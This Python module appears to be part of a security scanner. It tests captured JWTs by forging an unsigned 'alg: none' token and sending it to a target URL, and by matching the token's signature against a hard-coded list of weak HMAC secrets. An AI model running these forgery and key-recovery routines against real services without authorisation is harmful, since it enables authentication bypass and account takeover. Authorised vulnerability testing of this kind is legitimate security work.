import json
import base64
import hashlib
import hmac

import requests

try:
    import jwt as pyjwt
    HAS_PYJWT = True
except ImportError:
    pyjwt = None
    HAS_PYJWT = False


WEAK_SECRETS = [
    "secret",
    "password",
    "123456",
    "admin",
    "test",
    "your-256-bit-secret",
    "jwt_secret",
    "changeme",
    "default",
    "key",
    "mysecret",
    "jwt",
    "token",
    "supersecret",
]


def _base64url_encode(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def _base64url_decode(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    padding = 4 - len(data) % 4
    if padding != 4:
        data += b"=" * padding
    return base64.urlsafe_b64decode(data)


def _decode_jwt_parts(jwt_token):
    """Decode JWT header and payload without verification."""
    try:
        parts = jwt_token.split(".")
        if len(parts) != 3:
            return None, None

        header = json.loads(_base64url_decode(parts[0]))
        payload = json.loads(_base64url_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None

def extract_jwts_from_results(all_secrets):
    jwt_tokens = []

    for secret in all_secrets:
        secret_type = secret.get("type", "").lower()
        value = secret.get("value", "")

        if "jwt" in secret_type or "bearer" in secret_type:
            if value and value.count(".") == 2 and value.startswith("ey"):
                jwt_tokens.append(value)

    return jwt_tokens


def test_jwt_none_algorithm(jwt_token, url, headers=None, timeout=5):
    header, payload = _decode_jwt_parts(jwt_token)
    if header is None or payload is None:
        return False

    forged_header = {"alg": "none", "typ": "JWT"}
    forged_token = (
        _base64url_encode(json.dumps(forged_header, separators=(",", ":")))
        + "."
        + _base64url_encode(json.dumps(payload, separators=(",", ":")))
        + "."
    )

    test_headers = dict(headers) if headers else {}
    test_headers["Authorization"] = f"Bearer {forged_token}"

    try:
        resp = requests.get(
            url,
            headers=test_headers,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
        return resp.status_code in (200, 201)
    except Exception:
        return False


def test_jwt_weak_secret(jwt_token, url=None, headers=None, timeout=5):
    header, payload = _decode_jwt_parts(jwt_token)
    if header is None or payload is None:
        return None

    parts = jwt_token.split(".")
    if len(parts) != 3:
        return None


    signing_input = f"{parts[0]}.{parts[1]}"
    original_signature = parts[2]

    alg = header.get("alg", "HS256").upper()
    if alg == "HS384":
        digest_fn = hashlib.sha384
    elif alg == "HS512":
        digest_fn = hashlib.sha512
    else:
        digest_fn = hashlib.sha256

    for weak_secret in WEAK_SECRETS:
        try:
            sig = hmac.new(
                weak_secret.encode("utf-8"),
                signing_input.encode("utf-8"),
                digest_fn,
            ).digest()
            computed_sig = _base64url_encode(sig)
            if computed_sig == original_signature:
                return weak_secret
        except Exception:
            continue

    return None